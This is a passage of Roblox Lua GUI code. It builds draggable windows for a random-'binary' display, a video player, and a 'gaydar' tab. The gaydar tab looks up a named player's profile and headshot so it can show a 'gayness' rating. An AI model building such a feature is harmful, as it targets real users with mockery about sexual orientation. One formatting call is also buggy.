box["binary tab top bar close button text padding"].PaddingTop = UDim.new(0, -1)
box["binary tab top bar close button text padding"].Parent = box["binary tab top bar close button"]

box["binary tab top bar close button"].MouseButton1Click:Connect(function()
	if not binarytabcanminimize then return end
	if binaryrunning then
		binaryrunning:Disconnect()
		binaryrunning = nil
	end
	binarytabopen = false
	binarytabminimized = false
	playclicksound()
	box["binary tab top bar"].Visible = false
	repos(box["binary tab top bar"], 0, 246, 230 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

box["binary tab top bar minimize button"].Size = UDim2.new(0, 18, 0, 18)
box["binary tab top bar minimize button"].Position = UDim2.new(0, 200, 0, 4.7)

box["binary tab top bar minimize button"].BackgroundColor3 = box["default background color"]

box["binary tab top bar minimize button"].BorderColor3 = box["default border color"]
box["binary tab top bar minimize button"].BorderSizePixel = 1

box["binary tab top bar minimize button"].TextColor3 = box["default border color"]
box["binary tab top bar minimize button"].Font = Enum.Font.RobotoMono
box["binary tab top bar minimize button"].TextSize = 16
box["binary tab top bar minimize button"].TextScaled = false
box["binary tab top bar minimize button"].Visible = true
box["binary tab top bar minimize button"].Text = "-"
box["binary tab top bar minimize button"].TextXAlignment = Enum.TextXAlignment.Center
box["binary tab top bar minimize button"].TextYAlignment = Enum.TextYAlignment.Center

box["binary tab top bar minimize button"].Parent = box["binary tab top bar"]
box["binary tab top bar minimize button"].ZIndex = 114

box["binary tab top bar minimize button text padding"] = Instance.new("UIPadding")
box["binary tab top bar minimize button text padding"].PaddingTop = UDim.new(0, -2)
box["binary tab top bar minimize button text padding"].Parent = box["binary tab top bar minimize button"]

binarytabminimized = false
binarytabcanminimize = true

box["binary tab top bar minimize button"].MouseButton1Click:Connect(function()
	if not binarytabcanminimize then return end
	spawn(playclicksound)
	binarytabcanminimize = false

	binarytabminimized = not binarytabminimized

	if binarytabminimized then
		box["binary tab top bar minimize button"].Text = "+"
		box["binary tab block main frame"].Visible = true

		local fadeTween = fade(box["binary tab block main frame"], 0, 0.2)
		fadeTween.Completed:Wait()
		box["binary tab main frame 1"].Visible = false

		local tween = tweenSizePosition(
			box["binary tab block main frame"],
			UDim2.new(0, 246, 0, 0),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()

		binarytabreallyminimized = true
		box["binary tab block main frame"].Visible = false
		updcols()
	else
		box["binary tab top bar minimize button"].Text = "-"
		box["binary tab block main frame"].Visible = true

		local tween = tweenSizePosition(
			box["binary tab block main frame"],
			UDim2.new(0, 246, 0, 203),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()
		box["binary tab main frame 1"].Visible = true

		local fadeTween = fade(box["binary tab block main frame"], 1, 0.2)
		fadeTween.Completed:Wait()

		binarytabreallyminimized = false
		box["binary tab block main frame"].Visible = false
		updcols()
	end

	binarytabcanminimize = true
end)

-------------------------------------------------------------------------------------------------------------------------------

box["binary tab top bar reposition button"].Size = UDim2.new(0, 18, 0, 18)
box["binary tab top bar reposition button"].Position = UDim2.new(0, 176, 0, 4.7)

box["binary tab top bar reposition button"].BackgroundColor3 = box["default background color"]

box["binary tab top bar reposition button"].BorderColor3 = box["default border color"]
box["binary tab top bar reposition button"].BorderSizePixel = 1

box["binary tab top bar reposition button"].TextColor3 = box["default border color"]
box["binary tab top bar reposition button"].Font = Enum.Font.RobotoMono
box["binary tab top bar reposition button"].TextSize = 16
box["binary tab top bar reposition button"].TextScaled = false
box["binary tab top bar reposition button"].Text = "R"
box["binary tab top bar reposition button"].TextXAlignment = Enum.TextXAlignment.Center
box["binary tab top bar reposition button"].TextYAlignment = Enum.TextYAlignment.Center

box["binary tab top bar reposition button"].Parent = box["binary tab top bar"]
box["binary tab top bar reposition button"].ZIndex = 114

box["binary tab top bar reposition button text padding"] = Instance.new("UIPadding")
box["binary tab top bar reposition button text padding"].PaddingTop = UDim.new(0, -1)
box["binary tab top bar reposition button text padding"].Parent = box["binary tab top bar reposition button"]

box["binary tab top bar reposition button"].MouseButton1Click:Connect(function()
	playclicksound()
	repos(box["binary tab top bar"], 0.5, 246, 230 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

box["binary tab main frame 1"].Size = UDim2.new(0, 246, 0, 204)
box["binary tab main frame 1"].Position = UDim2.new(0, 0, 1, 0)

box["binary tab main frame 1"].BackgroundColor3 = box["default background color"]

box["binary tab main frame 1"].BorderColor3 = box["default border color"]
box["binary tab main frame 1"].BorderSizePixel = 1

box["binary tab main frame 1"].Parent = box["binary tab top bar"]
box["binary tab main frame 1"].ZIndex = 112

box["binary"].Size = UDim2.new(0, 238, 0, 195)
box["binary"].Position = UDim2.new(0, 4, 0, 5)

box["binary"].BackgroundColor3 = box["default background color"]

box["binary"].BorderColor3 = box["default border color"]
box["binary"].BorderSizePixel = 1

box["binary"].Parent = box["binary tab main frame 1"]
box["binary"].ZIndex = 113

box["binary"].Font = Enum.Font.RobotoMono
box["binary"].TextColor3 = Color3.new(1, 1, 1)
box["binary"].TextSize = 15
box["binary"].TextWrapped = true
box["binary"].TextXAlignment = Enum.TextXAlignment.Center
box["binary"].TextYAlignment = Enum.TextYAlignment.Center
box["binary"].ClipsDescendants = true
box["binary"].Name = "stay"

box["binary text padding"] = Instance.new("UIPadding")
box["binary text padding"].PaddingBottom = UDim.new(0, 0)
box["binary text padding"].Parent = box["binary"]

function grcl()
	local lines = {}
	for i = 1, 30 do
		table.insert(lines, grs(50))
	end
	return table.concat(lines, "\n")
end

function grcl2()
	local lines = {}
	for i = 1, 30 do
		table.insert(lines, grs2(34))
	end
	return table.concat(lines, "\n")
end

function changebinary()
	box["binary"].Text = grcl2()
end

-------------------------------------------------------------------------------------------------------------------------------

box["binary tab block main frame"].Size = UDim2.new(0, 276, 0, 233)
box["binary tab block main frame"].Position = UDim2.new(0, 0, 1, 1)

box["binary tab block main frame"].BackgroundColor3 = box["default background color"]

box["binary tab block main frame"].BorderColor3 = box["default border color"]
box["binary tab block main frame"].BorderSizePixel = 1
box["binary tab block main frame"].BackgroundTransparency = 1

box["binary tab block main frame"].Parent = box["binary tab top bar"]
box["binary tab block main frame"].ZIndex = 113
box["binary tab block main frame"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

box["binary tab block all"].Size = UDim2.new(0, 276, 0, 260)
box["binary tab block all"].Position = UDim2.new(0, 0, 0, 0)

box["binary tab block all"].BackgroundColor3 = box["default background color"]

box["binary tab block all"].BorderColor3 = box["default border color"]
box["binary tab block all"].BorderSizePixel = 1
box["binary tab block all"].BackgroundTransparency = 0

box["binary tab block all"].Parent = box["binary tab top bar"]
box["binary tab block all"].ZIndex = 114
box["binary tab block all"].Visible = true

-------------------------------------------------------------------------------------------------------------------------------

box["video tab top bar"].Size = UDim2.new(0, 208, 0, 26)

box["video tab top bar"].BackgroundColor3 = box["default background color"]

box["video tab top bar"].BorderColor3 = box["default border color"]
box["video tab top bar"].BorderSizePixel = 1

box["video tab top bar"].TextColor3 = box["default border color"]
box["video tab top bar"].Font = Enum.Font.RobotoMono
box["video tab top bar"].TextSize = 15
box["video tab top bar"].TextScaled = false
box["video tab top bar"].Text = " video.lua o.o"
box["video tab top bar"].TextXAlignment = Enum.TextXAlignment.Left
box["video tab top bar"].TextYAlignment = Enum.TextYAlignment.Center

box["video top bar text padding"] = Instance.new("UIPadding")
box["video top bar text padding"].PaddingLeft = UDim.new(0, 0)
box["video top bar text padding"].PaddingRight = UDim.new(0, 0)
box["video top bar text padding"].Parent = box["video tab top bar"]

box["video tab top bar"].Parent = box["screen gui"]
box["video tab top bar"].ZIndex = 413
box["video tab top bar"].Visible = false

function dragvideotabtopbar()
	local frame = box["video tab top bar"]
	local dragToggle 	
	local dragSpeed = 0.25
	local dragStart 	
	local startPos 

	local function updatebuttoninput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		box["tween service"]:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	box["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updatebuttoninput(input)
			end
		end
	end)
end

dragvideotabtopbar()

-------------------------------------------------------------------------------------------------------------------------------

box["video tab top bar close button"].Size = UDim2.new(0, 18, 0, 18)
box["video tab top bar close button"].Position = UDim2.new(0, 186, 0, 4.7)

box["video tab top bar close button"].BackgroundColor3 = box["default background color"]

box["video tab top bar close button"].BorderColor3 = box["default border color"]
box["video tab top bar close button"].BorderSizePixel = 1

box["video tab top bar close button"].TextColor3 = box["default border color"]
box["video tab top bar close button"].Font = Enum.Font.RobotoMono
box["video tab top bar close button"].TextSize = 16
box["video tab top bar close button"].TextScaled = false
box["video tab top bar close button"].Text = "X"
box["video tab top bar close button"].TextXAlignment = Enum.TextXAlignment.Center
box["video tab top bar close button"].TextYAlignment = Enum.TextYAlignment.Center

box["video tab top bar close button"].Parent = box["video tab top bar"]
box["video tab top bar close button"].ZIndex = 414

box["video tab top bar close button text padding"] = Instance.new("UIPadding")
box["video tab top bar close button text padding"].PaddingTop = UDim.new(0, -1)
box["video tab top bar close button text padding"].Parent = box["video tab top bar close button"]

box["video tab top bar close button"].MouseButton1Click:Connect(function()
	if not videotabcanminimize then return end
	videotabopen = false
	videotabminimized = false
	playclicksound()
	box["video tab top bar"].Visible = false
	repos(box["video tab top bar"], 0, 208, 315 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

box["video tab top bar minimize button"].Size = UDim2.new(0, 18, 0, 18)
box["video tab top bar minimize button"].Position = UDim2.new(0, 162, 0, 4.7)

box["video tab top bar minimize button"].BackgroundColor3 = box["default background color"]

box["video tab top bar minimize button"].BorderColor3 = box["default border color"]
box["video tab top bar minimize button"].BorderSizePixel = 1

box["video tab top bar minimize button"].TextColor3 = box["default border color"]
box["video tab top bar minimize button"].Font = Enum.Font.RobotoMono
box["video tab top bar minimize button"].TextSize = 16
box["video tab top bar minimize button"].TextScaled = false
box["video tab top bar minimize button"].Visible = true
box["video tab top bar minimize button"].Text = "-"
box["video tab top bar minimize button"].TextXAlignment = Enum.TextXAlignment.Center
box["video tab top bar minimize button"].TextYAlignment = Enum.TextYAlignment.Center

box["video tab top bar minimize button"].Parent = box["video tab top bar"]
box["video tab top bar minimize button"].ZIndex = 414

box["video tab top bar minimize button text padding"] = Instance.new("UIPadding")
box["video tab top bar minimize button text padding"].PaddingTop = UDim.new(0, -2)
box["video tab top bar minimize button text padding"].Parent = box["video tab top bar minimize button"]

videotabminimized = false
videotabcanminimize = true

box["video tab top bar minimize button"].MouseButton1Click:Connect(function()
	if not videotabcanminimize then return end
	spawn(playclicksound)
	videotabcanminimize = false

	videotabminimized = not videotabminimized

	if videotabminimized then
		box["video tab top bar minimize button"].Text = "+"
		box["video tab block main frame"].Visible = true

		local fadeTween = fade(box["video tab block main frame"], 0, 0.2)
		fadeTween.Completed:Wait()
		box["video tab main frame 1"].Visible = false

		local tween = tweenSizePosition(
			box["video tab block main frame"],
			UDim2.new(0, 208, 0, 0),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()

		videotabreallyminimized = true
		box["video tab block main frame"].Visible = false
		updcols()
	else
		box["video tab top bar minimize button"].Text = "-"
		box["video tab block main frame"].Visible = true

		local tween = tweenSizePosition(
			box["video tab block main frame"],
			UDim2.new(0, 208, 0, 288),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()
		box["video tab main frame 1"].Visible = true

		local fadeTween = fade(box["video tab block main frame"], 1, 0.2)
		fadeTween.Completed:Wait()

		videotabreallyminimized = false
		box["video tab block main frame"].Visible = false
		updcols()
	end

	videotabcanminimize = true
end)

-------------------------------------------------------------------------------------------------------------------------------

box["video tab top bar reposition button"].Size = UDim2.new(0, 18, 0, 18)
box["video tab top bar reposition button"].Position = UDim2.new(0, 138, 0, 4.7)

box["video tab top bar reposition button"].BackgroundColor3 = box["default background color"]

box["video tab top bar reposition button"].BorderColor3 = box["default border color"]
box["video tab top bar reposition button"].BorderSizePixel = 1

box["video tab top bar reposition button"].TextColor3 = box["default border color"]
box["video tab top bar reposition button"].Font = Enum.Font.RobotoMono
box["video tab top bar reposition button"].TextSize = 16
box["video tab top bar reposition button"].TextScaled = false
box["video tab top bar reposition button"].Text = "R"
box["video tab top bar reposition button"].TextXAlignment = Enum.TextXAlignment.Center
box["video tab top bar reposition button"].TextYAlignment = Enum.TextYAlignment.Center

box["video tab top bar reposition button"].Parent = box["video tab top bar"]
box["video tab top bar reposition button"].ZIndex = 414

box["video tab top bar reposition button text padding"] = Instance.new("UIPadding")
box["video tab top bar reposition button text padding"].PaddingTop = UDim.new(0, -1)
box["video tab top bar reposition button text padding"].Parent = box["video tab top bar reposition button"]

box["video tab top bar reposition button"].MouseButton1Click:Connect(function()
	playclicksound()
	repos(box["video tab top bar"], 0.5, 208, 315 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

box["video tab main frame 1"].Size = UDim2.new(0, 208, 0, 289)
box["video tab main frame 1"].Position = UDim2.new(0, 0, 1, 0)

box["video tab main frame 1"].BackgroundColor3 = box["default background color"]

box["video tab main frame 1"].BorderColor3 = box["default border color"]
box["video tab main frame 1"].BorderSizePixel = 1

box["video tab main frame 1"].Parent = box["video tab top bar"]
box["video tab main frame 1"].ZIndex = 412

-------------------------------------------------------------------------------------------------------------------------------

box["video id textbox"].Size = UDim2.new(0, 200, 0, 35)
box["video id textbox"].Position = UDim2.new(0, 4, 0, 210)
box["video id textbox"].BackgroundColor3 = box["default background color"]
box["video id textbox"].BorderColor3 = box["default border color"]
box["video id textbox"].BorderSizePixel = 1
box["video id textbox"].Parent = box["video tab main frame 1"]
box["video id textbox"].Font = Enum.Font.RobotoMono
box["video id textbox"].TextColor3 = Color3.new(1, 1, 1)
box["video id textbox"].Text = ""
box["video id textbox"].PlaceholderText = "enter videoframe ID"
box["video id textbox"].PlaceholderColor3 = box["default 1/2 color"]
box["video id textbox"].TextSize = 15
box["video id textbox"].TextWrapped = true
box["video id textbox"].TextXAlignment = Enum.TextXAlignment.Center
box["video id textbox"].TextYAlignment = Enum.TextYAlignment.Center
box["video id textbox"].ClipsDescendants = true
box["video id textbox"].ZIndex = 413

box["video id enter"] = Instance.new("TextButton")
box["video id enter"].Size = UDim2.new(0, 200, 0, 35)
box["video id enter"].Position = UDim2.new(0, 4, 0, 250)
box["video id enter"].BackgroundColor3 = box["default background color"]
box["video id enter"].BorderColor3 = box["default border color"]
box["video id enter"].BorderSizePixel = 1
box["video id enter"].Parent = box["video tab main frame 1"]
box["video id enter"].Font = Enum.Font.RobotoMono
box["video id enter"].TextColor3 = Color3.new(1, 1, 1)
box["video id enter"].Text = "set video"
box["video id enter"].TextSize = 15
box["video id enter"].TextWrapped = true
box["video id enter"].TextXAlignment = Enum.TextXAlignment.Center
box["video id enter"].TextYAlignment = Enum.TextYAlignment.Center
box["video id enter"].ClipsDescendants = true
box["video id enter"].ZIndex = 413

box["video id enter"].MouseButton1Click:Connect(function()
	spawn(playclicksound)
	box["video"].Video = "rbxassetid://" .. box["video id textbox"].Text
	box["video"].Looped = true
	box["video"]:Play()
end)

box["video"].Size = UDim2.new(0, 200, 0, 200)
box["video"].Position = UDim2.new(0, 4, 0, 5)
box["video"].BackgroundColor3 = box["default background color"]
box["video"].BorderColor3 = box["default border color"]
box["video"].BorderSizePixel = 1
box["video"].Parent = box["video tab main frame 1"]
box["video"].ZIndex = 413

-------------------------------------------------------------------------------------------------------------------------------

box["video tab block main frame"].Size = UDim2.new(0, 208, 0, 288)
box["video tab block main frame"].Position = UDim2.new(0, 0, 1, 1)

box["video tab block main frame"].BackgroundColor3 = box["default background color"]

box["video tab block main frame"].BorderColor3 = box["default border color"]
box["video tab block main frame"].BorderSizePixel = 1
box["video tab block main frame"].BackgroundTransparency = 1

box["video tab block main frame"].Parent = box["video tab top bar"]
box["video tab block main frame"].ZIndex = 413
box["video tab block main frame"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

box["video tab block all"].Size = UDim2.new(0, 238, 0, 315)
box["video tab block all"].Position = UDim2.new(0, 0, 0, 0)

box["video tab block all"].BackgroundColor3 = box["default background color"]

box["video tab block all"].BorderColor3 = box["default border color"]
box["video tab block all"].BorderSizePixel = 1
box["video tab block all"].BackgroundTransparency = 0

box["video tab block all"].Parent = box["video tab top bar"]
box["video tab block all"].ZIndex = 414
box["video tab block all"].Visible = true

-------------------------------------------------------------------------------------------------------------------------------

box["gaydar tab top bar"].Size = UDim2.new(0, 376, 0, 26)
box["gaydar tab top bar"].BackgroundColor3 = box["default background color"]

box["gaydar tab top bar"].BorderColor3 = box["default border color"]
box["gaydar tab top bar"].BorderSizePixel = 1

box["gaydar tab top bar"].TextColor3 = box["default border color"]
box["gaydar tab top bar"].Font = Enum.Font.RobotoMono
box["gaydar tab top bar"].TextSize = 15
box["gaydar tab top bar"].TextScaled = false
box["gaydar tab top bar"].Text = " gaydar.lua o.o"
box["gaydar tab top bar"].TextXAlignment = Enum.TextXAlignment.Left
box["gaydar tab top bar"].TextYAlignment = Enum.TextYAlignment.Center

box["gaydar top bar text padding"] = Instance.new("UIPadding")
box["gaydar top bar text padding"].PaddingLeft = UDim.new(0, 0)
box["gaydar top bar text padding"].PaddingRight = UDim.new(0, 0)
box["gaydar top bar text padding"].Parent = box["gaydar tab top bar"]

box["gaydar tab top bar"].Parent = box["screen gui"]
box["gaydar tab top bar"].ZIndex = 313
box["gaydar tab top bar"].Visible = false

function draggaydartabtopbar()
	local frame = box["gaydar tab top bar"]
	local dragToggle 	
	local dragSpeed = 0.25
	local dragStart 	
	local startPos 

	local function updatebuttoninput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		box["tween service"]:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	box["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updatebuttoninput(input)
			end
		end
	end)
end

draggaydartabtopbar()

-------------------------------------------------------------------------------------------------------------------------------

box["gaydar tab top bar close button"].Size = UDim2.new(0, 18, 0, 18)
box["gaydar tab top bar close button"].Position = UDim2.new(0, 354, 0, 4.7)

box["gaydar tab top bar close button"].BackgroundColor3 = box["default background color"]

box["gaydar tab top bar close button"].BorderColor3 = box["default border color"]
box["gaydar tab top bar close button"].BorderSizePixel = 1

box["gaydar tab top bar close button"].TextColor3 = box["default border color"]
box["gaydar tab top bar close button"].Font = Enum.Font.RobotoMono
box["gaydar tab top bar close button"].TextSize = 16
box["gaydar tab top bar close button"].TextScaled = false
box["gaydar tab top bar close button"].Text = "X"
box["gaydar tab top bar close button"].TextXAlignment = Enum.TextXAlignment.Center
box["gaydar tab top bar close button"].TextYAlignment = Enum.TextYAlignment.Center

box["gaydar tab top bar close button"].Parent = box["gaydar tab top bar"]
box["gaydar tab top bar close button"].ZIndex = 314

box["gaydar tab top bar close button text padding"] = Instance.new("UIPadding")
box["gaydar tab top bar close button text padding"].PaddingTop = UDim.new(0, -1)
box["gaydar tab top bar close button text padding"].Parent = box["gaydar tab top bar close button"]

box["gaydar tab top bar close button"].MouseButton1Click:Connect(function()
	if not gaydartabcanminimize then return end
	gaydartabopen = false
	gaydartabminimized = false
	playclicksound()
	box["gaydar tab top bar"].Visible = false
	repos(box["gaydar tab top bar"], 0, 376, 230 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

box["gaydar tab top bar minimize button"].Size = UDim2.new(0, 18, 0, 18)
box["gaydar tab top bar minimize button"].Position = UDim2.new(0, 330, 0, 4.7)

box["gaydar tab top bar minimize button"].BackgroundColor3 = box["default background color"]

box["gaydar tab top bar minimize button"].BorderColor3 = box["default border color"]
box["gaydar tab top bar minimize button"].BorderSizePixel = 1

box["gaydar tab top bar minimize button"].TextColor3 = box["default border color"]
box["gaydar tab top bar minimize button"].Font = Enum.Font.RobotoMono
box["gaydar tab top bar minimize button"].TextSize = 16
box["gaydar tab top bar minimize button"].TextScaled = false
box["gaydar tab top bar minimize button"].Visible = true
box["gaydar tab top bar minimize button"].Text = "-"
box["gaydar tab top bar minimize button"].TextXAlignment = Enum.TextXAlignment.Center
box["gaydar tab top bar minimize button"].TextYAlignment = Enum.TextYAlignment.Center

box["gaydar tab top bar minimize button"].Parent = box["gaydar tab top bar"]
box["gaydar tab top bar minimize button"].ZIndex = 314

box["gaydar tab top bar minimize button text padding"] = Instance.new("UIPadding")
box["gaydar tab top bar minimize button text padding"].PaddingTop = UDim.new(0, -2)
box["gaydar tab top bar minimize button text padding"].Parent = box["gaydar tab top bar minimize button"]

gaydartabminimized = false
gaydartabcanminimize = true

box["gaydar tab top bar minimize button"].MouseButton1Click:Connect(function()
	if not gaydartabcanminimize then return end
	spawn(playclicksound)
	gaydartabcanminimize = false

	gaydartabminimized = not gaydartabminimized

	if gaydartabminimized then
		box["gaydar tab top bar minimize button"].Text = "+"
		box["gaydar tab block main frame"].Visible = true

		local fadeTween = fade(box["gaydar tab block main frame"], 0, 0.2)
		fadeTween.Completed:Wait()
		box["gaydar tab main frame 1"].Visible = false

		local tween = tweenSizePosition(
			box["gaydar tab block main frame"],
			UDim2.new(0, 376, 0, 0),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()

		gaydartabreallyminimized = true
		box["gaydar tab block main frame"].Visible = false
		updcols()
	else
		box["gaydar tab top bar minimize button"].Text = "-"
		box["gaydar tab block main frame"].Visible = true

		local tween = tweenSizePosition(
			box["gaydar tab block main frame"],
			UDim2.new(0, 376, 0, 203),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()
		box["gaydar tab main frame 1"].Visible = true

		local fadeTween = fade(box["gaydar tab block main frame"], 1, 0.2)
		fadeTween.Completed:Wait()

		gaydartabreallyminimized = false
		box["gaydar tab block main frame"].Visible = false
		updcols()
	end

	gaydartabcanminimize = true
end)

-------------------------------------------------------------------------------------------------------------------------------

box["gaydar tab top bar reposition button"].Size = UDim2.new(0, 18, 0, 18)
box["gaydar tab top bar reposition button"].Position = UDim2.new(0, 306, 0, 4.7)

box["gaydar tab top bar reposition button"].BackgroundColor3 = box["default background color"]

box["gaydar tab top bar reposition button"].BorderColor3 = box["default border color"]
box["gaydar tab top bar reposition button"].BorderSizePixel = 1

box["gaydar tab top bar reposition button"].TextColor3 = box["default border color"]
box["gaydar tab top bar reposition button"].Font = Enum.Font.RobotoMono
box["gaydar tab top bar reposition button"].TextSize = 16
box["gaydar tab top bar reposition button"].TextScaled = false
box["gaydar tab top bar reposition button"].Text = "R"
box["gaydar tab top bar reposition button"].TextXAlignment = Enum.TextXAlignment.Center
box["gaydar tab top bar reposition button"].TextYAlignment = Enum.TextYAlignment.Center

box["gaydar tab top bar reposition button"].Parent = box["gaydar tab top bar"]
box["gaydar tab top bar reposition button"].ZIndex = 314

box["gaydar tab top bar reposition button text padding"] = Instance.new("UIPadding")
box["gaydar tab top bar reposition button text padding"].PaddingTop = UDim.new(0, -1)
box["gaydar tab top bar reposition button text padding"].Parent = box["gaydar tab top bar reposition button"]

box["gaydar tab top bar reposition button"].MouseButton1Click:Connect(function()
	playclicksound()
	repos(box["gaydar tab top bar"], 0.5, 376, 230 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

box["gaydar tab main frame 1"].Size = UDim2.new(0, 376, 0, 204)
box["gaydar tab main frame 1"].Position = UDim2.new(0, 0, 1, 0)

box["gaydar tab main frame 1"].BackgroundColor3 = box["default background color"]

box["gaydar tab main frame 1"].BorderColor3 = box["default border color"]
box["gaydar tab main frame 1"].BorderSizePixel = 1

box["gaydar tab main frame 1"].Parent = box["gaydar tab top bar"]
box["gaydar tab main frame 1"].ZIndex = 312

box["gaydar"].Size = UDim2.new(0, 89, 0, 89)
box["gaydar"].Position = UDim2.new(0, 283, 0, 5)
box["gaydar"].BackgroundColor3 = box["default background color"]
box["gaydar"].BorderColor3 = box["default border color"]
box["gaydar"].BorderSizePixel = 1
box["gaydar"].Parent = box["gaydar tab main frame 1"]
box["gaydar"].ZIndex = 313

box["gaydar scan"] = Instance.new("TextButton")
box["gaydar scan"].Size = UDim2.new(0, 368, 0, 48)
box["gaydar scan"].Position = UDim2.new(0, 4, 0, 152)
box["gaydar scan"].BackgroundColor3 = box["default background color"]
box["gaydar scan"].BorderColor3 = box["default border color"]
box["gaydar scan"].BorderSizePixel = 1
box["gaydar scan"].Parent = box["gaydar tab main frame 1"]
box["gaydar scan"].ZIndex = 313

box["gaydar scan"].Font = Enum.Font.RobotoMono
box["gaydar scan"].TextColor3 = Color3.new(1, 1, 1)
box["gaydar scan"].Text = "scan target"
box["gaydar scan"].TextSize = 15
box["gaydar scan"].TextWrapped = true
box["gaydar scan"].TextXAlignment = Enum.TextXAlignment.Center
box["gaydar scan"].TextYAlignment = Enum.TextYAlignment.Center
box["gaydar scan"].ClipsDescendants = true

box["gaydar scan text padding"] = Instance.new("UIPadding")
box["gaydar scan text padding"].PaddingBottom = UDim.new(0, 0)
box["gaydar scan text padding"].Parent = box["gaydar scan"]

box["gaydar target"].Size = UDim2.new(0, 368, 0, 48)
box["gaydar target"].Position = UDim2.new(0, 4, 0, 99)
box["gaydar target"].BackgroundColor3 = box["default background color"]
box["gaydar target"].BorderColor3 = box["default border color"]
box["gaydar target"].BorderSizePixel = 1
box["gaydar target"].Parent = box["gaydar tab main frame 1"]
box["gaydar target"].ZIndex = 313

box["gaydar target"].Font = Enum.Font.RobotoMono
box["gaydar target"].TextColor3 = Color3.new(1, 1, 1)
box["gaydar target"].Text = ""
box["gaydar target"].PlaceholderText = "enter user"
box["gaydar target"].PlaceholderColor3 = box["default 1/2 color"]
box["gaydar target"].TextSize = 15
box["gaydar target"].TextWrapped = true
box["gaydar target"].TextXAlignment = Enum.TextXAlignment.Center
box["gaydar target"].TextYAlignment = Enum.TextYAlignment.Center
box["gaydar target"].ClipsDescendants = true

spawn(function()
	box["gaydar target"]:GetPropertyChangedSignal("Text"):Connect(function()
		if #box["gaydar target"].Text > 20 then
			box["gaydar target"].Text = string.sub(box["gaydar target"].Text, 1, 20)
		end
	end)
end)

box["gaydar target text padding"] = Instance.new("UIPadding")
box["gaydar target text padding"].PaddingBottom = UDim.new(0, 0)
box["gaydar target text padding"].Parent = box["gaydar scan"]

box["gaydar info"] = Instance.new("TextLabel")
box["gaydar info"].Size = UDim2.new(0, 274, 0, 89)
box["gaydar info"].Position = UDim2.new(0, 4, 0, 5)
box["gaydar info"].BackgroundColor3 = box["default background color"]
box["gaydar info"].BorderColor3 = box["default border color"]
box["gaydar info"].BorderSizePixel = 1
box["gaydar info"].Parent = box["gaydar tab main frame 1"]
box["gaydar info"].ZIndex = 313

box["gaydar info"].Font = Enum.Font.RobotoMono
box["gaydar info"].TextColor3 = Color3.new(1, 1, 1)
box["gaydar info"].Text = "target: n/a\nuser: n/a\n\ngayness: n/a\naccuracy: n/a"
box["gaydar info"].TextSize = 15
box["gaydar info"].TextWrapped = true
box["gaydar info"].TextXAlignment = Enum.TextXAlignment.Left
box["gaydar info"].TextYAlignment = Enum.TextYAlignment.Center
box["gaydar info"].ClipsDescendants = true

box["gaydar info text padding"] = Instance.new("UIPadding")
box["gaydar info text padding"].PaddingBottom = UDim.new(0, 2)
box["gaydar info text padding"].PaddingLeft = UDim.new(0, 5)
box["gaydar info text padding"].Parent = box["gaydar info"]

-------------------------------------------------------------------------------------------------------------------------------

local targetuserinfo = {
	username = nil,
	displayName = nil,
	userId = nil,
	thumbnail = nil
}

box["gaydar target"].FocusLost:Connect(function()
	local username = box["gaydar target"].Text:match("^%s*(.-)%s*$")
	if username == "" then
		cangaydarscan = true
		box["gaydar info"].Text = "target: n/a\nuser: n/a\n\ngayness: n/a\naccuracy: n/a"
		targetuserinfo = {
			username = nil,
			displayName = nil,
			userId = nil,
			thumbnail = nil
		}
		return
	end

	local success, userId = pcall(function()
		return game:GetService("Players"):GetUserIdFromNameAsync(username)
	end)

	if not success then
		box["gaydar info"].Text = string.format("target: %s\nuser: %s\n\ngayness: n/a\naccuracy: n/a", username)
		targetuserinfo = {
			username = username,
			displayName = nil,
			userId = nil,
			thumbnail = nil
		}
		return
	end

	local displayName
	success, displayName = pcall(function()
		return game:GetService("Players"):GetNameFromUserIdAsync(userId)
	end)

	if not success then
		displayName = username
	end

	local thumbnail
	success, thumbnail = pcall(function()
		return game:GetService("Players"):GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
	end)

	if success and box["gaydar"]:IsA("ImageLabel") then
		box["gaydar"].Image = thumbnail
	end

	targetuserinfo = {
		username = username,
		displayName = displayName,
		userId = userId,
		thumbnail = thumbnail
	}

	box["gaydar info"].Text = string.format("target: %s\nuser: %s\n\ngayness: n/a\naccuracy: n/a", username, displayName)
